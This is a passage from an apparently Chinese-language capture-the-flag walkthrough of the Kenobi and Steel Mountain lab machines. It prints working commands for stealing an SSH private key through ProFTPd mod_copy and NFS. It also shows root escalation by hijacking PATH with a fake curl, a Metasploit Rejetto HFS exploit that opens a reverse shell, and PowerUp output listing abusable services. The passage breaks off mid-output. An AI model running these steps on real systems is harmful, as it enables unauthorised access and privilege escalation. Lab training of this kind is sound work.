<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">#连接目标机的FTP服务器<span class="token punctuation">,</span>FTP运行在21端口
nc 10.10.54.34 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa  #将密钥复制到NFS所挂载的/var目录下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240404095647434.png" alt="image-20240404095647434"></p>
<p>然后让我们将目标机的/var/tmp 目录挂载到我们的攻击机上：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">mkdir /mnt/kenobiNFS
mount 10.10.54.<span class="token property">34</span><span class="token punctuation">:</span>/var /mnt/kenobiNFS   #此处的ip是目标机ip。完成挂载后：目标机的/var目录下的所有文件，都将在攻击机的/mnt/kenobiNFS目录下
ls -la /mnt/kenobiNFS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240404100004248.png" alt="image-20240404100004248"></p>
<p>复制Kenobi的ssh私钥到攻击机当前目录，然后使用ssh登录到 Kenobi 的帐户，查看标志性文件：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.67.234 -oHostKeyAlgorithms=+ssh-rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240404100843433.png" alt="image-20240404100843433"></p>
<pre><code> 这条命令是在Linux系统中使用OpenSSH客户端连接到远程主机的命令行语句。其中，每个参数的含义如下：
</code></pre>
<ul>
<li><code>ssh</code>：OpenSSH客户端命令，负责连接到远程主机并启动Shell。</li>
<li><code>-i</code>：指定使用哪个私钥文件进行身份认证。</li>
<li><code>id_rsa</code>：指定使用<code>~/.ssh/id_rsa</code>文件作为私钥。</li>
<li><code>kenobi</code>：远程主机的用户名。</li>
<li><code>@</code>：用户名和IP地址之间的分隔符。</li>
<li><code>10.10.67.234</code>：远程主机的IP地址。</li>
<li><code>-o</code>：指定连接选项。</li>
<li><code>HostKeyAlgorithms</code>：指定允许使用的主机密钥算法。</li>
<li><code>+ssh-rsa</code>：指定允许使用RSA签名密钥算法进行连接。</li>
</ul>
<p>总之，这条命令的作用是使用指定的私钥(<code>id_rsa</code>)连接到远程主机(<code>10.10.67.234</code>)，并允许使用RSA签名密钥算法进行身份认证。</p>
<p><img src="image-20240404101212748.png" alt="image-20240404101212748"></p>
<h2 id="通过PATH变量提权">通过PATH变量提权</h2>
<p>我们先了解SUID、SGID和SBIT(Sticky Bits)，这三个概念 我们在提权基础篇有详细讲解：</p>
<p><img src="image-20240404101427124.png" alt="image-20240404101427124"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">权限                        在文件上                                            在目录上
SUID Bit             用户使用文件所有者的权限执行文件                               <span class="token operator">-</span>
SGID Bit             用户在组所有者的权限下执行该文件                          在目录中创建的文件获取相同的组所有者。
Sticky Bit           无意义                                                阻止用户删除其他用户目录下的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>SUID位是很不安全的，一些二进制文件确实需要提高权限来运行才被赋予SUID位(如/usr/bin/passwd，因为你需要使用它以便在系统上重置个人密码)，但是其他具有 SUID 位的自定义文件可能会导致各种各样的问题。</p>
<p>要在目标机系统中搜索SUID/SGID类型的文件，请在目标机上运行以下命令：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">find <span class="token operator">/</span> -perm -u=s -type f 2&gt;/dev/<span class="token null keyword">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240404101934649.png" alt="image-20240404101934649"></p>
<p>找出看起来很不寻常的文件/usr/bin/menu ，并尝试执行它：</p>
<p><img src="image-20240404102807352.png" alt="image-20240404102807352"></p>
<p>strings 是 Linux 上的一个命令，它能在二进制文件上查找人类可读的字符串，我们使用以下命令来查看/usr/bin/menu运行时的信息（因为执行menu命令时有文字回显，我们才使用strings命令）：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">strings /usr/bin/menu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240404102929567.png" alt="image-20240404102929567"></p>
<p><img src="image-20240404103003344.png" alt="image-20240404103003344"></p>
<p>观察上图可以得知：当我们执行/usr/bin/menu 时，选择选项1其实是在执行一个<code>curl</code>命令，选择选项2其实是在执行<code>uname -r</code>命令。</p>
<p>这表明二进制文件curl和uname，是在没有完整路径的情况下运行的(例如没有使用/usr/bin/curl 或/usr/bin/uname运行文件)。</p>
<p>我们已经知道/usr/bin/menu文件是一个SUID文件，它在执行时会暂时具有root 用户权限，我们可以尝试自定义创建一个curl文件（并写入/bin/bash，意思是打开一个bash shell），然后我们再给自定义的curl文件附加可执行权限（+x），接着将自定义的curl文件所在的路径添加到PATH变量中（这样能够保证我们自定义的curl文件能够被首先找到）。</p>
<p>完成以上操作之后，执行SUID文件/usr/bin/menu，产生的效果是：以root权限打开一个bash shell-----这将获得root shell</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">cd /tmp
echo /bin/bash <span class="token operator">&gt;</span> curl
chmod +x curl
export PATH=/<span class="token property">tmp</span><span class="token punctuation">:</span><span class="token variable">$PATH</span>   #新添加的路径/tmp会在PATH变量的最前面，这样就能用我们伪造的curl文件代替真实的curl文件，保证自定义的curl文件被成功执行
/usr/bin/menu            #在跳出选项时，我们选择选项1，这样就能调用到伪造的curl文件
ls /root/
cat /root/root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240404103321329.png" alt="image-20240404103321329"></p>
<p><img src="image-20240404103347734.png" alt="image-20240404103347734"></p>
<p><img src="image-20240404103424630.png" alt="image-20240404103424630"></p>
<h2 id="总结-3">总结</h2>
<p>这里涉及的知识有点多：思路是nmap常规扫描，发现445和139端口暴露，接着尝试枚举Samba共享，发现存在三个共享的路径，并且其中有的可以匿名访问，访问成功之后，发现其中有个log.txt文件，下载下来发现其中含有kenobi用户的ssh秘钥以及ProFtpd信息。</p>
<p>接着利用端口111的rpcbind服务，发现该服务启动了nfs，之后枚举nfs发现存在2个可以远程共享访问的目录，看到第二个目录下存在的信息很多，尝试之后挂载该目录到我们本地上。接着看一下当前ftp服务对应版本，发现存在相关漏洞，利用该漏洞，直接将靶机的ssh秘钥文件下载到了我们要挂载的目录上。接着用nfs挂载到我们本地上之后，成功拿到ssh秘钥，接着ssh登录，之后就是提权了，不过这里用算是个环境变量劫持吧。</p>
<p>先是发现对方的suid文件中有一个可以的文件menu发现其中执行了curl的命令，然后我们尝试将/bin/bash写入到curl命令中，然后将该curl对应的路径提添加到环境变量最前面，就相当于命令替换了，接着运行menu文件（属主为root），相当于以root用户运行了/bin/bash，也就提权了</p>
<h1>0x04 Steel Mountain挑战</h1>
<p>闯入以机器人先生为主题的 Windows 机器。使用 metasploit 进行初始访问，利用 powershell 进行 Windows 权限提升枚举，并学习获取管理员访问权限的新技术。</p>
<p>在此聊天室中，你将枚举一台 Windows 计算机，使用 Metasploit 获得初始访问权限，使用 Powershell 进一步枚举该计算机，并将您的权限提升为管理员。</p>
<p>如果您没有合适的安全工具和环境，请部署您自己的 Kali Linux 机器，并使用我们的 Kali Room 在您的浏览器中对其进行控制。</p>
<p>请注意，此计算机不响应 ping （ICMP），可能需要几分钟才能启动。</p>
<p><img src="image-20240404105347646.png" alt="image-20240404105347646"></p>
<p><img src="image-20240404105355919.png" alt="image-20240404105355919"></p>
<p><img src="image-20240404105401049.png" alt="image-20240404105401049"></p>
<h2 id="初始访问">初始访问</h2>
<p>也是很迷惑，至今还是在摸索如何才能较为恰当的使用nmap扫描命令，感觉选的总不是最佳的，慢慢体会吧</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">nmap -Pn -sV -sC 10.10.97.69<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240404110823643.png" alt="image-20240404110823643"></p>
<p>除了默认的80端口之外，目标站点还开放了8080端口提供http服务，查看8080端口的webserver页面：</p>
<p><img src="image-20240404111228286.png" alt="image-20240404111228286"></p>
<p><img src="image-20240404111240162.png" alt="image-20240404111240162"></p>
<p>可见这里的文件服务器是rejetto http file server</p>
<p><img src="image-20240404112515408.png" alt="image-20240404112515408"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">msfconsole -q             #跳过提示语打开msf
search Rejetto
use exploit/windows/http/rejetto_hfs_exec
options
set RHOSTS 10.10.97.69
set RPORT 8080
set LHOST 10.11.81.232    #当使用OpenVPN连接到TryHackMe内网时，需要设置该选项为tun0地址
exploit                   #或者run

shell                     #由meterpreter shell界面进入Windows shell界面
cd <span class="token property">C</span><span class="token punctuation">:</span>\Users\bill\Desktop\
dir
more user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240404113036011.png" alt="image-20240404113036011"></p>
<p><img src="image-20240404113057883.png" alt="image-20240404113057883"></p>
<h2 id="权限提升-2">权限提升</h2>
<p>现在，您在此 Windows 计算机上有一个初始 shell，即 Bill，我们可以进一步枚举该计算机并将我们的权限升级为 root！</p>
<p>现在我们在这台机器上有了一个初始 shell，我们可以进一步枚举操作系统信息并查看将权限升级到root的利用点，使用名为“ PowerUp”的 PowerShell 脚本来评估这台 Windows 机器并确定目标机是否存在任何异常和错误配置。</p>
<p>下载脚本到你的本地终端(注意不要使用命令行的形式下载这个脚本，而是复制脚本内容并新建一个ps1文件):</p>
<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></p>
<p>一旦脚本保存在本地，就可以通过 meterpreter shell 上传该脚本:（这里我直接git了github项目）</p>
<p><img src="image-20240404113753554.png" alt="image-20240404113753554"></p>
<p><img src="image-20240404113840187.png" alt="image-20240404113840187"></p>
<p>然后我们可以通过meterpreter会话来加载PowerShell扩展，并进入 PowerShell的shell界面并执行脚本:</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">load powershell
powershell_shell
Import-Module .\PowerUp.ps1
Invoke-AllChecks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">meterpreter <span class="token operator">&gt;</span> load powershell                                                                         
Loading extension powershell...Success.                                                               
meterpreter <span class="token operator">&gt;</span> powershell_shell                                                                        
PS <span class="token operator">&gt;</span> Import-Moudle .\PowerUp.ps1                                                                  
PS <span class="token operator">&gt;</span> Invoke-AllChecks                                                                                 
                                                                                                   
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> AdvancedSystemCareService9                                                           
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\Advanced SystemCare\ASCService.exe                      
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\<span class="token punctuation">;</span> IdentityReference=BUILTIN\Users<span class="token punctuation">;</span> Permissions=AppendData/AddSubd
irectory<span class="token punctuation">}</span>                                                                                             
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'AdvancedSystemCareService9'</span> -Path             
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> True                                                                                 
<span class="token property">Name</span>           <span class="token punctuation">:</span> AdvancedSystemCareService9                                                           
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> AdvancedSystemCareService9                                                           
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\Advanced SystemCare\ASCService.exe                      
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\<span class="token punctuation">;</span> IdentityReference=BUILTIN\Users<span class="token punctuation">;</span> Permissions=WriteData/AddFile<span class="token punctuation">}</span>
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'AdvancedSystemCareService9'</span> -Path             
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> True                                                                                 
<span class="token property">Name</span>           <span class="token punctuation">:</span> AdvancedSystemCareService9                                                           
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> AdvancedSystemCareService9                                                           
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\Advanced SystemCare\ASCService.exe                      
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit<span class="token punctuation">;</span> IdentityReference=STEELMOUNTAIN\bill<span class="token punctuation">;</span> 
                 Permissions=System.Object[]<span class="token punctuation">}</span>                                                         
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'AdvancedSystemCareService9'</span> -Path             
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> True                                                                                 
<span class="token property">Name</span>           <span class="token punctuation">:</span> AdvancedSystemCareService9                                                           
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> AdvancedSystemCareService9                                                           
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\Advanced SystemCare\ASCService.exe                      
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\Advanced SystemCare\ASCService.exe<span class="token punctuation">;</span>    
                 IdentityReference=STEELMOUNTAIN\bill<span class="token punctuation">;</span> Permissions=System.Object[]<span class="token punctuation">}</span>                   
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'AdvancedSystemCareService9'</span> -Path             
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> True                                                                                 
<span class="token property">Name</span>           <span class="token punctuation">:</span> AdvancedSystemCareService9                                                           
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> AWSLiteAgent                                                                         
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files\Amazon\XenTools\LiteAgent.exe                                       
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\<span class="token punctuation">;</span> IdentityReference=BUILTIN\Users<span class="token punctuation">;</span> Permissions=AppendData/AddSubd
irectory<span class="token punctuation">}</span>                                                                                             
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'AWSLiteAgent'</span> -Path                           
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> False                                                                                
<span class="token property">Name</span>           <span class="token punctuation">:</span> AWSLiteAgent                                                                         
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> AWSLiteAgent                                                                         
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files\Amazon\XenTools\LiteAgent.exe                                       
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\<span class="token punctuation">;</span> IdentityReference=BUILTIN\Users<span class="token punctuation">;</span> Permissions=WriteData/AddFile<span class="token punctuation">}</span>
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'AWSLiteAgent'</span> -Path                           
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> False                                                                                
<span class="token property">Name</span>           <span class="token punctuation">:</span> AWSLiteAgent                                                                         
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> IObitUnSvr                                                                           
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\IObit Uninstaller\IUService.exe                         
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\<span class="token punctuation">;</span> IdentityReference=BUILTIN\Users<span class="token punctuation">;</span> Permissions=AppendData/AddSubd
irectory<span class="token punctuation">}</span>                                                                                             
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'IObitUnSvr'</span> -Path                             
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> False                                                                                
<span class="token property">Name</span>           <span class="token punctuation">:</span> IObitUnSvr                                                                           
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> IObitUnSvr                                                                           
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\IObit Uninstaller\IUService.exe                         
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\<span class="token punctuation">;</span> IdentityReference=BUILTIN\Users<span class="token punctuation">;</span> Permissions=WriteData/AddFile<span class="token punctuation">}</span>
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'IObitUnSvr'</span> -Path                             
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> False                                                                                
<span class="token property">Name</span>           <span class="token punctuation">:</span> IObitUnSvr                                                                           
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> IObitUnSvr                                                                           
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\IObit Uninstaller\IUService.exe                         
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit<span class="token punctuation">;</span> IdentityReference=STEELMOUNTAIN\bill<span class="token punctuation">;</span> 
                 Permissions=System.Object[]<span class="token punctuation">}</span>                                                         
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'IObitUnSvr'</span> -Path                             
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> False                                                                                
<span class="token property">Name</span>           <span class="token punctuation">:</span> IObitUnSvr                                                                           
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> IObitUnSvr                                                                           
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\IObit Uninstaller\IUService.exe                         
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\IObit Uninstaller\IUService.exe<span class="token punctuation">;</span>       
                 IdentityReference=STEELMOUNTAIN\bill<span class="token punctuation">;</span> Permissions=System.Object[]<span class="token punctuation">}</span>                   
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'IObitUnSvr'</span> -Path                             
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> False                                                                                
<span class="token property">Name</span>           <span class="token punctuation">:</span> IObitUnSvr                                                                           
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> LiveUpdateSvc                                                                        
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\LiveUpdate\LiveUpdate.exe                               
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\<span class="token punctuation">;</span> IdentityReference=BUILTIN\Users<span class="token punctuation">;</span> Permissions=AppendData/AddSubd
irectory<span class="token punctuation">}</span>                                                                                             
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'LiveUpdateSvc'</span> -Path                          
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> False                                                                                
<span class="token property">Name</span>           <span class="token punctuation">:</span> LiveUpdateSvc                                                                        
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> LiveUpdateSvc                                                                        
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\LiveUpdate\LiveUpdate.exe                               
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\<span class="token punctuation">;</span> IdentityReference=BUILTIN\Users<span class="token punctuation">;</span> Permissions=WriteData/AddFile<span class="token punctuation">}</span>
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'LiveUpdateSvc'</span> -Path                          
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> False                                                                                
<span class="token property">Name</span>           <span class="token punctuation">:</span> LiveUpdateSvc                                                                        
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>    <span class="token punctuation">:</span> LiveUpdateSvc                                                                        
<span class="token property">Path</span>           <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\LiveUpdate\LiveUpdate.exe                               
<span class="token property">ModifiablePath</span> <span class="token punctuation">:</span> @<span class="token punctuation">{</span>ModifiablePath=<span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\LiveUpdate\LiveUpdate.exe<span class="token punctuation">;</span>             
                 IdentityReference=STEELMOUNTAIN\bill<span class="token punctuation">;</span> Permissions=System.Object[]<span class="token punctuation">}</span>                   
<span class="token property">StartName</span>      <span class="token punctuation">:</span> LocalSystem                                                                          
<span class="token property">AbuseFunction</span>  <span class="token punctuation">:</span> Write-ServiceBinary -Name <span class="token string">'LiveUpdateSvc'</span> -Path                          
<span class="token property">CanRestart</span>     <span class="token punctuation">:</span> False                                                                                
<span class="token property">Name</span>           <span class="token punctuation">:</span> LiveUpdateSvc                                                                        
<span class="token property">Check</span>          <span class="token punctuation">:</span> Unquoted Service Paths                                                               
                                                                                                      
<span class="token property">ServiceName</span>                     <span class="token punctuation">:</span> AdvancedSystemCareService9                                          
<span class="token property">Path</span>                            <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\Advanced SystemCare\ASCService.exe     
<span class="token property">ModifiableFile</span>                  <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\Advanced SystemCare\ASCService.exe     
<span class="token property">ModifiableFilePermissions</span>       <span class="token punctuation">:</span> <span class="token punctuation">{</span>WriteAttributes<span class="token punctuation">,</span> Synchronize<span class="token punctuation">,</span> ReadControl<span class="token punctuation">,</span> ReadData/ListDirectory..
.<span class="token punctuation">}</span>                                                                                                    
<span class="token property">ModifiableFileIdentityReference</span> <span class="token punctuation">:</span> STEELMOUNTAIN\bill                                                  
<span class="token property">StartName</span>                       <span class="token punctuation">:</span> LocalSystem                                                         
<span class="token property">AbuseFunction</span>                   <span class="token punctuation">:</span> Install-ServiceBinary -Name <span class="token string">'AdvancedSystemCareService9'</span>            
<span class="token property">CanRestart</span>                      <span class="token punctuation">:</span> True                                                                
<span class="token property">Name</span>                            <span class="token punctuation">:</span> AdvancedSystemCareService9                                          
<span class="token property">Check</span>                           <span class="token punctuation">:</span> Modifiable Service Files                                            
                                                                                                      
<span class="token property">ServiceName</span>                     <span class="token punctuation">:</span> IObitUnSvr                                                          
<span class="token property">Path</span>                            <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\IObit Uninstaller\IUService.exe        
<span class="token property">ModifiableFile</span>                  <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\IObit Uninstaller\IUService.exe        
<span class="token property">ModifiableFilePermissions</span>       <span class="token punctuation">:</span> <span class="token punctuation">{</span>WriteAttributes<span class="token punctuation">,</span> Synchronize<span class="token punctuation">,</span> ReadControl<span class="token punctuation">,</span> ReadData/ListDirectory..
.<span class="token punctuation">}</span>                                                                                                    
<span class="token property">ModifiableFileIdentityReference</span> <span class="token punctuation">:</span> STEELMOUNTAIN\bill                                                  
<span class="token property">StartName</span>                       <span class="token punctuation">:</span> LocalSystem                                                         
<span class="token property">AbuseFunction</span>                   <span class="token punctuation">:</span> Install-ServiceBinary -Name <span class="token string">'IObitUnSvr'</span>                            
<span class="token property">CanRestart</span>                      <span class="token punctuation">:</span> False                                                               
<span class="token property">Name</span>                            <span class="token punctuation">:</span> IObitUnSvr                                                          
<span class="token property">Check</span>                           <span class="token punctuation">:</span> Modifiable Service Files                                            
                                                                                                      
<span class="token property">ServiceName</span>                     <span class="token punctuation">:</span> LiveUpdateSvc                                                       
<span class="token property">Path</span>                            <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\LiveUpdate\LiveUpdate.exe              
<span class="token property">ModifiableFile</span>                  <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\IObit\LiveUpdate\LiveUpdate.exe              
<span class="token property">ModifiableFilePermissions</span>       <span class="token punctuation">:</span> <span class="token punctuation">{</span>WriteAttributes<span class="token punctuation">,</span> Synchronize<span class="token punctuation">,</span> ReadControl<span class="token punctuation">,</span> ReadData/ListDirectory..
.<span class="token punctuation">}</span>                                                                                                    
<span class="token property">ModifiableFileIdentityReference</span> <span class="token punctuation">:</span> STEELMOUNTAIN\bill                                                  
<span class="token property">StartName</span>                       <span class="token punctuation">:</span> LocalSystem                                                         
<span class="token property">AbuseFunction</span>                   <span class="token punctuation">:</span> Install-ServiceBinary -Name <span class="token string">'LiveUpdateSvc'</span>                         
<span class="token property">CanRestart</span>                      <span class="token punctuation">:</span> False                                                               
